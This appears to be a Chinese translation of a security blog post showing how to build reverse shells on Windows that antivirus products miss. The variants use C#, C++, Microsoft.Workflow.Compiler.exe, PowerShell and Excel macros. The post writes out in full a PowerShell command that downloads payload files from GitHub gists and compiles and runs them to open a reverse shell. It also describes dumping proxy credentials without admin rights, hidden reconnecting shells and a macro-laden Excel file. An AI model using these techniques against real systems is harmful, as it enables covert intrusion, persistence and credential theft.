**在这篇文章中，我将跟大家分享如何利用C#和C++来开发反病毒产品无法检测到的反向Shell。**

![1.png](https://image.3001.net/images/20181203/1543842373_5c052a45c5244.png!small)

## 简单的C#反向Shell

GitHub上有很多能够通过cmd.exe打开反向Shell的C#代码样本。在这篇文章中，我会从GitHub上借鉴部分代码，然后用到了下面这个C#程序中。这个程序不能绕过AV，没有混淆代码，它能做的只有“在目标设备上打开socket，启动cmd.exe”：

![2.png](https://image.3001.net/images/20181203/1543842393_5c052a599c235.png!small)

源码链接：【[GitHub传送门](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)】

![3.png](https://image.3001.net/images/20181203/1543842400_5c052a60a59e4.png!small)

我用netcat开启了监听模式（端口443），然后编译并执行我的代码。

![4.png](https://image.3001.net/images/20181203/1543842407_5c052a672f488.png!small)

你可以看到，.exe文件通过了Windows Defender的检测，说明从AV的角度来看，它不会执行任何恶意操作，这也是正常的扫描结果。

![5.png](https://image.3001.net/images/20181203/1543842414_5c052a6e5096a.png!small)

执行文件之后，你将会看到命令行窗口，关闭窗口之后Shell也就终止运行了。

![6.png](https://image.3001.net/images/20181203/1543842853_5c052c253aedc.png!small)

运行exe文件之后，会直接在我的Kali上生成Shell。

### VirusTotal检测结果

![7.png](https://image.3001.net/images/20181203/1543842872_5c052c38b4028.png!small)

检测报告：【[点我获取](https://www.virustotal.com/#/file/983fe1c7d4cb293d072fcf11f8048058c458a928cbb9169c149b721082cf70aa/detection)】

## C++反向Shell+一定程度的持续感染

搜索片刻之后，我发现了一份有类似反向Shell功能的[C++代码](http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/)。而且我还找到了[@NinjaParanoid](https://twitter.com/NinjaParanoid)的代码，他的代码可以开启一个反向Shell，而且还有一定的持续感染特性【[参考资料](https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/)】。

这个脚本有三个主要优势：

> 1、 while循环可以每5秒尝试重连一次；
>
> 2、 不可见的cmd实例；
>
> 3、 如果标准攻击者IP发生变化，可自动获取新参数；

![8.png](https://image.3001.net/images/20181203/1543842894_5c052c4e7091f.png!small)![9.png](https://image.3001.net/images/20181203/1543842894_5c052c4eae4ef.png!small)![10.png](https://image.3001.net/images/20181203/1543842894_5c052c4e9c8bd.png!small)

这份代码所要做的事情游走于“恶意”与“合法”之间，但是Windows
Defender检测为“无威胁”。当你运行这个文件之后，Shell将会在5秒钟之后以“静默模式”打开。

![11.png](https://image.3001.net/images/20181203/1543842910_5c052c5ec701f.png!small)

对于用户来说，屏幕上啥也不会出现，但如果出现了问题，后台进程每5秒就会尝试自动重连我的Kali。

![12.png](https://image.3001.net/images/20181203/1543842995_5c052cb35fdbc.png!small)

### VirusTotal检测结果

![13.png](https://image.3001.net/images/20181203/1543843018_5c052ccaed8d8.png!small)

检测报告：【[点我获取](https://www.virustotal.com/#/file/a7592a117d2ebc07b0065a6a9cd8fb186f7374fae5806a24b5bcccd665a0dc07/detection)】

## 使用代理凭证通过网络开启C#反向Shell

在研究如何利用代理凭证并通过互联网从一个内部企业网络中打开反向Shell时，我开发出了下列代码：

> 1、 结合peewpw脚本在没有管理员权限的情况下从凭证管理器中导出代理凭证；
>
> 2、 对导出的凭证进行Base64编码；
>
> 3、 将它们插入到代理认证链接中；

![14.png](https://image.3001.net/images/20181203/1543843042_5c052ce2bc893.png!small)![15.png](https://image.3001.net/images/20181203/1543843042_5c052ce2c44c1.png!small)

在编译代码之前，你需要目标企业网络开启代理IP/端口。出于安全考虑，我不会直接发布源码，如果你有一点编程能力的话，我相信你可以自己搞定。

观察之后我发现，这种攻击的失败率非常高，因为目标用户可能不会在凭证管理器中存储域凭证。

当然了，Windows Defender和其他企业级AV解决方案都无法检测这种攻击方式。

## 通过C#与Microsoft.Workflow.Compiler.exe即时编译打开反向Shell

在研究过程中，我找到了几篇关于如何在Microsoft.Workflow.Compiler.exe中执行任意未签名代码的文章，所以我想用这种技术来开启我的反向Shell（C#）。简而言之，为了即时编译我的C#代码，我需要使用到Microsoft.Workflow.Compiler.exe服务。下面是命令样本：

![16.png](https://image.3001.net/images/20181203/1543843113_5c052d2942c19.png!small)

REV.txt的XOML结构如下：

![17.png](https://image.3001.net/images/20181203/1543843125_5c052d35198cd.png!small)

下图中包含待编译C#代码的原始结构（Rev.Shell代码）：

![18.png](https://image.3001.net/images/20181203/1543843135_5c052d3f46769.png!small)

运行命令之后，会发生下面几件事情：

> 1、 非无文件型：C#源代码需要从Rev.Shell文件中获取；
>
> 2、 无文件型：C# Payload会被编译并执行；
>
> 3、 无文件型：Payload开启反向Shell；

![19.png](https://image.3001.net/images/20181203/1543843149_5c052d4d5bb13.png!small)![20.png](https://image.3001.net/images/20181203/1543843149_5c052d4d988d3.png!small)

## 通过PowerShell和实时编译C#开启反向Shell

这都很简单，直接把文件交给Microsoft.Workflow.Compiler.exe来编译，那我们为什么不用PowerShell来实现呢？请看：

    
    
    powershell-command "& { (New-ObjectNet.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt','.\REV.txt') }" && powershell -command "& { (New-ObjectNet.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell','.\Rev.Shell') }" &&C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exeREV.txt Rev.Shell

![21.png](https://image.3001.net/images/20181203/1543843184_5c052d7005bf1.png!small)

运行命令之后，PS将会下载上述的两份文件，然后存储在文件系统中。接下来，它们会使用Microsoft.Workflow.Compiler.exe来实时编译C#代码，并开启反向Shell。

PowerShell命令：【[点我获取](https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt)】

REV.txt代码：【[点我获取](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)】

Rev.Shell代码：【[点我获取](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)】

![22.png](https://image.3001.net/images/20181203/1543843197_5c052d7dbdbb1.png!small)

## 通过Excel宏、PowerShell和C#实时编译开启反向Shell

现在，我想尝试把之前的PowerShell代码注入到宏文件中，你猜怎么着？

这个Excel文件并不会被检测为恶意文件，而且能够在不触发任何警报的情况下打开反向Shell。

![23.png](https://image.3001.net/images/20181203/1543843223_5c052d9715913.png!small)![24.png](https://image.3001.net/images/20181203/1543843222_5c052d96d6764.png!small)![25.png](https://image.3001.net/images/20181203/1543843223_5c052d976646e.png!small)

### VirusTotal检测结果

![26.png](https://image.3001.net/images/20181203/1543843241_5c052da9e8549.png!small)

检测报告：【[点我获取](https://www.virustotal.com/#/file/e81fe80f61a276d216c726e34ab0defc6e11fa6c333c87ec5c260f0018de89b4/detection)】

## 总结

虽然打开反向Shell的方式有很多种，但是这篇文章主要的目标是绕过反病毒产品的检测。而前两种Shell是目前市场上所有AV都无法检测到的。

***参考来源：[medium](https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

